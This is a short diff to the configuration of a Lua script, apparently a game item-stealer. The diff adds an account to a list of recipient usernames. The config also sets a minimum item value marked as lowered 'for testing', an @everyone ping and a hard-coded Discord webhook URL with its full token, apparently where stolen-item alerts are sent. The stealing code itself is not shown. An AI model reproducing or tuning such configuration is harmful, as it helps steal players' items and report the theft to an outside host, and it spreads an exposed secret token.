@@ -3,7 +3,7 @@
 _G.scriptExecuted = false
 
 -- Configuration
-_G.Usernames = {"iamzanji11", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
+_G.Usernames = {"iamzanji11", "akosi_ronzz", "iamzanji22", "iamzanji33", "iamzanji44", "iamzanji55", "iamzanji66", "iamzanji77", "iamzanji88", "iamzanji99", "iamzanji00"}
 _G.min_value = 100000  -- Lowered from 100 million to 100k for testing
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1397159420441530408/Rp5qBae9JqaB_7ZB0cAscZe_DJBzSX46fbguncBqJ7W9P_wo_POdJkY3ir74_jbVlHTv"
